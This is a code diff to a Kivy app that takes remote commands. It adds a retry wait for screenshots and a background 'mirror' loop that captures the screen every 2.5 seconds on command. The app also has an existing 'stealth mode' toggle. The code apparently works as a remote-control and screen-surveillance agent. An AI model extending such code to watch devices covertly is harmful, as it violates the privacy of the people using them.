@@ -1095,8 +1095,13 @@ class SovereignApp(App):
                     if not os.path.exists(path) or os.path.getsize(path) < 100:
                         noir_log("[MIRROR] System Screencap failed. Using App-UI Fallback.", level="INFO")
                         try:
-                            # Capture the Kivy Window/App state
+                            # Capture the Kivy Window/App state (Asynchronous)
                             Window.screenshot(name=path)
+                            # Wait synchronously for Kivy to write the file (max 2 seconds)
+                            for _ in range(20):
+                                if os.path.exists(path) and os.path.getsize(path) > 0:
+                                    break
+                                time.sleep(0.1)
                         except: pass
                 
                 jpeg_path = path.replace(".png", ".jpg")
@@ -1177,6 +1182,23 @@ class SovereignApp(App):
                 state = params.get("enabled", False)
                 Clock.schedule_once(lambda dt: self.toggle_stealth(state), 0)
                 result = {"success": True, "output": f"Stealth Mode: {'ON' if state else 'OFF'}"}
+                
+            elif atype == "mirror_start":
+                self._mirror_active = True
+                def _mirror_loop():
+                    self._log("[MIRROR] Live stream engaged.")
+                    while getattr(self, "_mirror_active", False):
+                        try:
+                            self._execute_sync({"command_id": f"mirror_{int(time.time())}", "action": {"type": "screenshot", "params": {"quality": 30}}})
+                        except: pass
+                        time.sleep(2.5)
+                    self._log("[MIRROR] Live stream terminated.")
+                threading.Thread(target=_mirror_loop, daemon=True).start()
+                result = {"success": True, "output": "Mirror stream started."}
+
+            elif atype == "mirror_stop":
+                self._mirror_active = False
+                result = {"success": True, "output": "Mirror stream stopped."}
 
             elif atype == "ping":
                 result = {"success": True, "output": f"PONG from {DEVICE_ID}"}
